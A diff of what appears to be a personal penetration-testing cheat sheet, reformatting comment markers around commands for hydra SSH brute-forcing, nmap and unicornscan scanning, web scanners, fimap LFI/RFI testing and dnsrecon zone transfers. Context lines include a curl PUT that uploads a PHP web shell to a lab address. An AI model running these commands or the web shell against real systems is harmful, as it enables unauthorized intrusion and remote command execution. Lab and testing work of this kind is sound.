@@ -64,7 +64,7 @@ hydra -L users -P 10_million_password_list_top_1000.txt -t 4 Target ip ssh -vv  
 
 PORT<NSE<searchspolit<google portservice <site list <forum<metasploit
 
-  == IP DISCOVERY ==
+##  == IP DISCOVERY ==
 netdiscover -r 10.0.2.0/24
 nmap -sP 10.195.0.0/16 // ping discovery scan
   
@@ -76,8 +76,8 @@ nmap -sV 192.168.1.1    // service detection
 nmap -sV --version-intensity 5 192.168.1.1 // service detection agressive. 0 is less agressive
 xprobe2 -v -p tcp:80:open IP
 
-== PORT SCANNING ==
-## nmap -sS is the default scanning mode // TCP SYN SCAN
+## == PORT SCANNING ==
+nmap -sS is the default scanning mode // TCP SYN SCAN
 nmap -iL list-of-ips.txt    //scan the targets from the text file
 nmap 192.168.1.1 /24   //scan a subnet
 nmap -F 192.168.1.1   //scan most common 100 ports. Fast.
@@ -93,9 +93,9 @@ nmap -Pn -F 192.168.1.1   //scan selected ports and ignore discovery
 us -H -msf -Iv 192.168.56.101 -p 1-65535  ## TCP connect SYN scan
 us -H -mU -Iv 192.168.56.101 -p 1-65535   ## UDP scan
 
-## -H = resolve hostnames 
-## -m = scan mode (sf - tcp, U - udp)
-## -Iv - verbose
+-H = resolve hostnames 
+-m = scan mode (sf - tcp, U - udp)
+-Iv - verbose
 
 ## Locate NSE scripts
 locate nse | grep script
@@ -171,7 +171,7 @@ curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.56.103/test/1.php
 #connect to a UDP port 
 nc -u localhost 161
 
-== WEB APPLICATION SCANNERS ==
+##== WEB APPLICATION SCANNERS ==
 ## scan Joomla
 joomscan -u http://192.168.230.150:8081
 
@@ -190,7 +190,7 @@ nikto -C all -h http://IP
 ## scan web apps
 skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
 skipfish -o 202 http://192.168.1.202/wordpress   ## Using the given directory for output (-o 202) , scan the web application URL 
-## (http://192.168.1.202/wordpress):
+ (http://192.168.1.202/wordpress):
 
 ## LFI, RFI, RCE
 uniscan -u http://192.168.44.134:10000/ -qweds
@@ -202,7 +202,7 @@ fimap -H -u "http://192.168.56.129" -d 3 -w /tmp/urllist
 fimap -m -l /tmp/urllist
 
 
-  == DNS enumeration ==
+##  == DNS enumeration ==
 dnsrecon -r 192.168.13.200-192.168.13.254 -n 192.168.13.220   //reverse lookup. dns server is -n
 dnsrecon -d acme.local -D /usr/share/golismero/wordlist/dns/dnsrecon.txt -t brt  //bruteforce the acme.local domain for domains and subdomains
 dnsrecon -a -d thinc.local -n 192.168.13.220  ## trying zone transfer. -n is the DNS server
